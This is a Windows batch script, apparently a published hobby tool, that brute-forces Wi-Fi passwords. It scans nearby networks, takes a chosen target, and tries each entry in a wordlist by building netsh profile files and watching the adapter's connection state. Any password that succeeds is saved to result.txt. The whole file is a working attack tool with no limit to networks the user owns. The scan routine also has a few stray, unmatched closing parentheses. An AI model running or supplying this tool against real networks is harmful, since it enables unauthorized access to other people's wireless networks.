@echo off
:: Batch Wi-Fi Brute Forcer - Developed By TechnicalUserX
:: Please refer to https://github.com/TechnicalUserX for more projects

:: This program is created to be a proof of concept that it is possible
:: to write a working Wi-Fi attack tool with Batchfiles since there 
:: are countless examples on the internet that claims to be legit
:: hacking tools, working on CMD. While this tool does not claim
:: a 100% success ratio, it still works if the target Wi-Fi has
:: weak password. :)

:: There is already a wordlist file in the repository but you are
:: free to use your own wordlists.

cls
setlocal enabledelayedexpansion
title Batch Wi-Fi Brute Forcer
color 0f

cd /D %~dp0

if not exist "importwifi.xml" (
    call :exit_fatal "importwifi.xml is missing. Exiting..."
)

if exist "importwifi_attempt.xml" (
    del importwifi_attempt.xml
)

if exist "importwifi_prepared.xml" (
    del importwifi_prepared.xml
)

:: Interface Variables
set interface_number=0
set interface_mac=not_defined
set interface_id=not_defined
set interface_state=not_defined
set interface_description=not_defined
set wifi_target=not_defined

set attack_counter_option=0

if not exist "wordlist.txt" (
    set wordlist_file=not_defined
) else (
    set wordlist_file=wordlist.txt
)


:program_entry
    call :interface_init
    call :mainmenu
goto :eof

:interface_detection
    cls
    echo.
    call :color_echo . yellow "Detecting interfaces..."
    echo.
    set interface_temp_index=0
    set interface_number=0

    set interface_parse_counter=0
    set interface_parse_begin=false
    set interface_parse_line=
    set interface_parse_arg=

    for /f "skip=2 tokens=* delims=" %%a in ('netsh wlan show interfaces ^| findstr /n "^"') do (
        set "interface_parse_line=%%a"
        set "interface_parse_line=!interface_parse_line:*:=!"
        
        if "!interface_parse_begin!" equ "true" if "!interface_parse_line!" neq "" (

            for /f "tokens=1,* delims=:" %%x in ('echo !interface_parse_line!') do set interface_parse_arg=%%y
            call :trim_spaces interface_parse_arg
            
            if "!interface_parse_counter!" equ "0" (
                set interface[!interface_temp_index!]_id=!interface_parse_arg!
            )

            if "!interface_parse_counter!" equ "1" (
                set interface[!interface_temp_index!]_description=!interface_parse_arg!
            )

            if "!interface_parse_counter!" equ "3" (
                set interface[!interface_temp_index!]_mac=!interface_parse_arg!
            )

            set /a interface_parse_counter=!interface_parse_counter!+1
        )

        if !interface_parse_counter! gtr 4 (
            set interface_parse_counter=0
            set /a interface_temp_index=!interface_temp_index!+1
            set interface_parse_begin=false
        )

        if "!interface_parse_line!" equ "" (
            set interface_parse_begin=true
        )

    )

    rem Last line must be redacted
    set /a interface_temp_index=!interface_temp_index!-1

    set /a interface_number=!interface_temp_index!+1
    timeout /t 2 >nul
    cls
goto :eof


:color_echo 

    :: Check if the first 2 arguments are empty, cause they are needed for background/foreground information
    :: The 3rd argument is not that important because it can be an empty string
    if "%~1" equ "" (
        goto :eof
    )
    if "%~2" equ "" (
        goto :eof
    )

    :: Background color; if invalid, no action
    if "%~1" equ "black" (
        <nul set /p=[40m
    )

    if "%~1" equ "red" (
        <nul set /p=[41m
    )

    if "%~1" equ "green" (
        <nul set /p=[42m
    )

    if "%~1" equ "yellow" (
        <nul set /p=[43m
    )

    if "%~1" equ "blue" (
        <nul set /p=[44m
    )

    if "%~1" equ "magenta" (
        <nul set /p=[45m
    )

    if "%~1" equ "cyan" (
        <nul set /p=[46m
    )

    if "%~1" equ "white" (
        <nul set /p=[47m
    )

    :: Foreground color; if invalid, no action

    if "%~2" equ "black" (
        <nul set /p=[30m
    )

    if "%~2" equ "red" (
        <nul set /p=[31m
    )

    if "%~2" equ "green" (
        <nul set /p=[32m
    )

    if "%~2" equ "yellow" (
        <nul set /p=[33m
    )

    if "%~2" equ "blue" (
        <nul set /p=[34m
    )

    if "%~2" equ "magenta" (
        <nul set /p=[35m
    )

    if "%~2" equ "cyan" (
        <nul set /p=[36m
    )

    if "%~2" equ "white" (
        <nul set /p=[37m
    )

    <nul set /p="%~3"

    <nul set /p=[0m
goto :eof


:interface_init
    cls
    :: Interface detection and selection
    call :interface_detection
    echo.
    call :color_echo . cyan " Interface Init"
    echo.
    echo.
	if "!interface_number!" equ "1" (

        call :color_echo . yellow " Only '1' Interface Found!"
        echo.
        echo.
        call :color_echo . white " !interface[0]_description!("
        call :color_echo . blue "!interface[0]_mac!"
        call :color_echo . white ")"
        echo.
        echo.
        echo Making !interface[0]_description! the default interface...
        set interface_id=!interface[0]_id!
        set interface_description=!interface[0]_description!
        set interface_mac=!interface[0]_mac!
        timeout /t 3 >nul
	)
	
	if !interface_number! gtr 1 (

        call :color_echo . yellow " Multiple '!interface_number!' Interfaces Found!"
        echo.
        timeout /t 3 >nul
        call :interface_selection
        
	)
	
	if "!interface_number!"=="0" (

        call :color_echo . yellow "WARNING"
        echo.
        echo No interfaces found on this device^^!
        echo.
        set interface_id=not_defined
        set interface_description=not_defined
        set interface_mac=not_defined
        pause
        cls
	)

goto :eof


:interface_selection
    cls
    echo.
    call :color_echo . cyan "Interface Selection"
    echo.
    echo.
    set wifi_target=not_defined
    set /a interface_number_zero_indexed=!interface_number!-1
    set /a cancel_index=!interface_number_zero_indexed!+1

    for /l %%a in ( 0, 1, !interface_number_zero_indexed! ) do (
        call :color_echo . magenta "%%a) "
        call :color_echo . white " !interface[%%a]_description!("
        call :color_echo . blue "!interface[%%a]_mac!"
        call :color_echo . white ")"
        echo.
    )
    call :color_echo
    call :color_echo . red "!cancel_index!) Cancel"
    echo.
    echo.

    call :program_prompt

    if "!program_prompt_input!" equ "" (
        call :program_prompt_invalid_input
        goto :interface_selection
    )

    if !program_prompt_input! leq !interface_number_zero_indexed! (
        if !program_prompt_input! geq 0 (
            echo.
            echo Making !interface[%program_prompt_input%]_description! the interface...
            set interface_id=!interface[%program_prompt_input%]_id!
            set interface_description=!interface[%program_prompt_input%]_description!
            set interface_mac=!interface[%program_prompt_input%]_mac!
            timeout /t 3 >nul
        ) else (
            if "!program_prompt_input!" equ "!cancel_index!" (
                set interface_id=not_defined
                set interface_description=not_defined
                set interface_mac=not_defined
                goto :eof
            ) else (
                call :program_prompt_invalid_input
                goto :interface_selection
            )
        )
    ) else (

        if "!program_prompt_input!" equ "!cancel_index!" (
            set interface_id=not_defined
            set interface_description=not_defined
            set interface_mac=not_defined
            goto :eof
        ) else (
            call :program_prompt_invalid_input
            goto :interface_selection
        )


    )


goto :eof


:program_prompt
    call :color_echo . green " bruteforcer"
    call :color_echo . white "$ "
    set /p program_prompt_input=
goto :eof


:program_prompt_invalid_input
    call :color_echo . red "Invalid input"
    timeout /t 3 >nul
goto :eof


:mainmenu
    cls
    echo.
    call :color_echo . cyan "Batch Wi-Fi Brute Forcer"
    echo.
    echo.
    call :color_echo . magenta "Interface : "
    call :color_echo . white "!interface_description!("
    call :color_echo . blue "!interface_mac!"
    call :color_echo . white ") "
    echo.
    call :color_echo . magenta "ID        : "
    call :color_echo . white "!interface_id!"
    echo.
    call :color_echo . magenta "Target    : "
    call :color_echo . white "!wifi_target!"
    echo.
    call :color_echo . magenta "Wordlist  : "
    call :color_echo . white "!wordlist_file!"
    echo.
    echo.
    echo Type 'help' for more info
    echo.
    call :program_prompt
    echo.

    if "!program_prompt_input!" equ "scan" (
        call :scan
        goto :mainmenu
    )

    if "!program_prompt_input!" equ "interface" (
        call :interface_init
        goto :mainmenu
    )

    if "!program_prompt_input!" equ "attack" (
        call :attack
        goto :mainmenu
    )

    if "!program_prompt_input!" equ "help" (
        call :help
        goto :mainmenu
    )


    if "!program_prompt_input!" equ "wordlist" (
        call :wordlist
        goto :mainmenu
    )

    if "!program_prompt_input!" equ "counter" (
        call :counter
        goto :mainmenu
    )

    if "!program_prompt_input!" equ "exit" (
        exit
    )

    call :program_prompt_invalid_input
goto :mainmenu


:scan
    cls
    netsh wlan disconnect interface="%interface_id%" > nul

    call :interface_find_state

    if "%interface_state%" neq "disconnected" (
        timeout /t 1 > nul
        goto :scan
    )

    if "!interface_id!" equ "not_defined" (
        call :color_echo . red "You have to select an interface to perform a scan"
        set wifi_target=not_defined
        echo.
        echo.
        pause
        goto :eof
    )

    echo.
    call :color_echo . cyan "Possible Wi-Fi Networks"
    echo.
    echo.
    echo Scanning...
    echo.
    :: wifi[] is the array for possible wifis
    set scan_wifi_index=0
    set cancel_index=0

    set scan_parse_counter=0
    set scan_parse_begin=false
    set scan_parse_line=
    set scan_parse_arg=

    for /f "skip=3 tokens=* delims=" %%a in ('netsh wlan show networks mode^=bssid interface^="%interface_id%" ^| findstr /n "^"') do (
        
        set "scan_parse_line=%%a"
        set "scan_parse_line=!scan_parse_line:*:=!"

        if "!scan_parse_begin!" equ "true" if "scan_parse_line" neq "" (

            for /f "tokens=1,* delims=:" %%x in ('echo !scan_parse_line!') do set scan_parse_arg=%%y
            call :trim_spaces scan_parse_arg

            if "!scan_parse_counter!" equ "0" (
                set wifi[!scan_wifi_index!]_ssid=!scan_parse_arg!
            )

            if "!scan_parse_counter!" equ "5" (
                set wifi[!scan_wifi_index!]_signal=!scan_parse_arg!
            )

            set /a scan_parse_counter=!scan_parse_counter!+1

        )

        if !scan_parse_counter! gtr 5 (
            set scan_parse_counter=0
            set /a scan_wifi_index=!scan_wifi_index!+1
            set scan_parse_begin=false
        )

        if "!scan_parse_line!" equ "" (
            set scan_parse_begin=true
        )

    )
    set /a scan_wifi_index=!scan_wifi_index!-1
    set /a cancel_index=!scan_wifi_index!+1
    
    for /l %%a in ( 0, 1, !scan_wifi_index! ) do (

        call :color_echo . magenta "%%a) "

        if "!wifi[%%a]_ssid!" equ "" (
            call :color_echo . red "No Name "
        ) else (
            call :color_echo . white "!wifi[%%a]_ssid! "
        )

        call :color_echo . blue "!wifi[%%a]_signal!"
        echo.
    )


    call :color_echo . red "!cancel_index!) Cancel"
    echo.
    echo.

    call :program_prompt
    echo.
    if "!program_prompt_input!" equ "!cancel_index!" (
        goto :eof
    )
    if !program_prompt_input! leq !scan_wifi_index! if !program_prompt_input! geq 0 (
            set "wifi_target=!wifi[%program_prompt_input%]_ssid!"
            goto :eof
        )
        )
    )

    )
    )

    call :program_prompt_invalid_input

goto :eof


:attack

    set attack_finalize=false

    if "!wordlist_file!" equ "not_defined" (
        cls
        echo.
        call :color_echo . red "Please provide a wordlist..."
        echo.
        echo.
        pause
        goto :eof
    )


    if "!wifi_target!" equ "not_defined" (
        cls
        echo.
        call :color_echo . red "Please select a target after scanning..."
        echo.
        echo.
        pause
        goto :eof
    )

    if "!interface_id!" equ "not_defined" (
        cls
        echo.
        call :color_echo . red "Please select an interface..."
        echo.
        echo.
        pause
        goto :eof
    )

    cls
    echo.
    call :color_echo . yellow "WARNING"
    echo.
    echo.
    echo If you connected to a network with the same name as this: "!wifi_target!",
    echo its profile will be deleted.
    echo.
    echo This app might not find the correct password if the signal strength
    echo is too low. Remember, this is an online attack. Expect slow attempts.
    echo.
    echo When an authentication is detected, attack counter is
    echo automatically increased by 5 to ensure successful connection.
    echo.
    pause
    netsh wlan delete profile name="!wifi_target!" interface="!interface_id!">nul
    cls

    :: Prepare ssid import
    del /Q /F importwifi_prepared.xml 2>nul
    for /f "tokens=*" %%a in ( importwifi.xml ) do (
        set variable=%%a
        echo !variable:changethistitle=%wifi_target%!>>importwifi_prepared.xml
    )

    set password_count=0
    
    for /f "tokens=1" %%a in ( !wordlist_file! ) do (

        set /a password_count=!password_count!+1
        set password=%%a
		set temp_auth_num=0
        call :prepare_attempt "!password!"
        netsh wlan add profile filename="importwifi_attempt.xml" interface="!interface_id!" >nul
        cls
        echo.
        call :color_echo . cyan "Attacking"
        echo.
        echo.
        call :color_echo . magenta "Target Wi-Fi   : "
        call :color_echo . white "!wifi_target!"
        echo.
        call :color_echo . magenta "Password Count : "
        call :color_echo . white "!password_count!"
        echo.
        echo.
        call :color_echo . blue "Trying password -> "
        call :color_echo . yellow "!password!"
        echo.
        echo.
        call :color_echo . cyan "Attempts: "
        echo.

        call :attack_attempt

        if "!attack_finalize!" equ "true" (
            set attack_finalize=false
            goto :eof
        )

    )

    call :attack_failure
goto :eof


:attack_failure
    del /Q /F importwifi_prepared.xml 2>nul
    del /Q /F importwifi_attempt.xml 2>nul
    cls
    echo.
    call :color_echo . red "Could not find the password"
    echo.
    echo.
    netsh wlan delete profile "!wifi_target!" interface="!interface_id!">nul
    pause
goto :eof

:attack_success
    del /Q /F importwifi_prepared.xml 2>nul
    del /Q /F importwifi_attempt.xml 2>nul
    cls
    echo.
    call :color_echo . green "Found the password"
    echo.
    echo.
    echo.
    call :color_echo . magenta "Target     : "
    call :color_echo . white "!wifi_target!"
    echo.
    call :color_echo . magenta "Password   : "
    call :color_echo . white "!password!"
    echo.
    call :color_echo . magenta "At attempt : "
    call :color_echo . white "!password_count!"
    echo.
    echo.

    echo Batch Wi-Fi Brute Forcer Result>>result.txt
    echo Target     : !wifi_target!>>result.txt
    echo At attempt : !password_count!>>result.txt
    echo Password   : !password!>>result.txt
    echo.>>result.txt
    pause
goto :eof

:attack_attempt
	netsh wlan connect name="!wifi_target!" interface="!interface_id!" >nul

    if "%attack_counter_option%" equ "0" (
        set attack_counter=9
    ) else (
        set attack_counter=!attack_counter_option!
    )

    set attack_authenticating_detected=false

    for /l %%a in ( 1, 1, 40 ) do (

        if "!attack_counter!" equ "0" (
            del /Q /F importwifi_attempt.xml 2>nul
            goto :eof
        )

        call :color_echo . white "Attempts Left ("
        call :color_echo . magenta "!attack_counter!"
        call :color_echo . white ") "

        call :interface_find_state

        if "!interface_state!"=="disconnecting" (
            call :color_echo . red "Trying..."
            echo.
        )
        if "!interface_state!"=="disconnected" (
            call :color_echo . red "Trying..."
            echo.
        )
        if "!interface_state!"=="authenticating" (
            call :color_echo . blue "Authenticating"
            echo.
        )
        if "!interface_state!"=="connecting" (
            call :color_echo . yellow "Connecting"
            echo.
        )
        if "!interface_state!"=="connected" (
            call :color_echo . green "Connected"
            echo.
            timeout /t 2 /nobreak>nul
        )

        if "!interface_state!" equ "authenticating" (
            if "!attack_authenticating_detected!" equ "false" (
                set /a attack_counter=!attack_counter!+5
                set attack_authenticating_detected=true
            )
        ) 

        if "!interface_state!" equ "connecting" (
            del /Q /F importwifi_attempt.xml 2>nul
            set attack_finalize=true
            call :attack_success
            goto :eof
        )

        if "!interface_state!" equ "connected" (
            del /Q /F importwifi_attempt.xml 2>nul
            set attack_finalize=true
            call :attack_success
            goto :eof
        )
        
        set /a attack_counter=!attack_counter!-1
    )

goto :eof

:help
	cls
	echo.
	call :color_echo . cyan "Commands"
	echo.
	echo.
	echo  - help             : Displays this page
	echo  - wordlist         : Provide a wordlist file
	echo  - scan             : Performs a WI-FI scan
	echo  - interface        : Open Interface Management
	echo  - attack           : Attacks selected WI-FI
	echo  - counter          : Sets the attack counter
	echo  - exit             : Close the program
	echo.
	echo  For more information, please refer to "README.md".
	echo.
	echo  More projects from TechnicalUserX:
	echo  https://github.com/TechnicalUserX
	echo.
	echo.
	echo Press any key to continue...
	pause >nul

goto :eof


:wordlist
    cls
    echo.
    call :color_echo . cyan "Wordlist"
    echo.
    echo.
    echo Please provide a valid wordlist
    echo.
    call :program_prompt
    echo.
    if not exist "!program_prompt_input!" (
        call :color_echo . red "Provided path does not resolve to a file"
        timeout /t 2 >nul
    ) else (
        set wordlist_file=!program_prompt_input!
        goto :eof
    )
goto :eof

:counter
    cls
    echo.
    call :color_echo . cyan "Set Attempt Count"
    echo.
    echo.
    echo Please provide number for per-password 
    echo counter while attacking a network.
    echo.
    echo This counter will be used to query network
    echo connection whether it is successful.
    echo.
    call :program_prompt
    echo.
    echo %program_prompt_input%| findstr /r "^[0-9]*$" >nul
    
    if "%errorlevel%" equ "0" (
        set attack_counter_option=!program_prompt_input!
    ) else (
        call :color_echo . red "Provided input is not a valid number"
        timeout /t 2 >nul
    )
goto :eof


:prepare_attempt
	for /f "tokens=*" %%x in ( importwifi_prepared.xml ) do (
		set code=%%x
		echo !code:changethiskey=%~1!>>importwifi_attempt.xml
    )
goto :eof


:interface_find_state

    for /f "tokens=2 delims==" %%A in ('wmic path WIN32_NetworkAdapter where "NetConnectionID='%interface_id%'" get NetConnectionStatus /value') do (
        set interface_status_code=%%A
    )

    if "%interface_status_code%"=="1" (
        set interface_state=connecting
    )

    if "%interface_status_code%"=="2" (
        set interface_state=connected
    )
    
    if "%interface_status_code%"=="3" (
        set interface_state=disconnecting
    )

    if "%interface_status_code%"=="7" (
        set interface_state=disconnected
    )

    if "%interface_status_code%"=="8" (
        set interface_state=authenticating
    )



goto :eof


:exit_fatal
    call :color_echo . red "%~1"
    timeout /t 3 >nul
    exit
goto :eof

:trim_right
        set "str=!%~1!"
        :trim_right_loop
        if "!str:~-1!"==" " (
        set "str=!str:~0,-1!"
        goto trim_right_loop
        )
        set %~1=!str!
goto :eof

:trim_left
set "str=!%~1!"
:trim_left_loop
if "!str:~0,1!"==" " (
    set "str=!str:~1!"
    goto trim_left_loop
)
set %~1=!str!
goto :eof

:trim_spaces
        call :trim_left %1
        call :trim_right %1
goto :eof